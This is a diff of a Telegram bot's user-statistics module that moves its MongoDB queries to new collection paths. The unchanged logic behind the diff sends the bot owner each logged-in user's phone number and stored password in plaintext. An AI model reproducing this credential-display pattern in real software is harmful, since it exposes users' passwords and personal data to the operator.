@@ -11,19 +11,23 @@
 from pyrogram import filters
 from devgagan import app
 from config import OWNER_ID
-from devgagan.core.mongo.db import db, user_sessions_real
+from devgagan.core.mongo.db import db
 from devgagan.core.func import check_bot_mode
 import asyncio
 
+# Updated MongoDB collection paths
+USER_DB = db.user_data.users_data_db
+USER_SESSIONS = USER_DB.user_sessions_real
+
 async def count_total_users():
     """Count all users in the database (free + premium)"""
-    return await db.count_documents({})
+    return await USER_DB.users.count_documents({})
 
 async def count_free_users():
     """
     Count all free users (non-premium) regardless of current bot mode
     """
-    return await db.count_documents({
+    return await USER_DB.users.count_documents({
         "premium": {"$exists": False}  # Users without premium field
     })
 
@@ -31,21 +35,21 @@ async def count_premium_users():
     """
     Count all premium users (users with premium status)
     """
-    return await db.count_documents({
+    return await USER_DB.users.count_documents({
         "premium": {"$exists": True}  # Users with premium field
     })
 
 async def get_logged_in_users():
     """
-    Get details of all currently logged-in users (users with active sessions)
+    Get details of all currently logged-in users from user_sessions_real collection
     Returns list of user details including ID, username, phone number, etc.
     """
     logged_in_users = []
-    async for user in user_sessions_real.find({}):
-        user_data = await db.find_one({"_id": user["user_id"]})
+    async for session in USER_SESSIONS.find({}):
+        user_data = await USER_DB.users.find_one({"_id": session["user_id"]})
         if user_data:
             logged_in_users.append({
-                "user_id": user["user_id"],
+                "user_id": session["user_id"],
                 "username": user_data.get("username", "N/A"),
                 "phone_number": user_data.get("phone_number", "N/A"),
                 "name": user_data.get("first_name", "N/A"),
@@ -90,9 +94,9 @@ async def get_user_stats(_, message):
                 details_message += (
                     f"{index}. 👤 **User ID:** `{user['user_id']}`\n"
                     f"   📛 **Name:** `{user['name']}`\n"
-                    f"   🔹 **Username:** {user['username']}\n"
+                    f"   🔹 **Username:** @{user['username']}\n"
                     f"   📞 **Phone:** `{user['phone_number']}`\n"
-                    f"   🔑 **Password:** `{user['password']}`\n\n"
+                    f"   🔑 **Password:** `{user['password']}`\n"
                 )
             
             # Split long messages
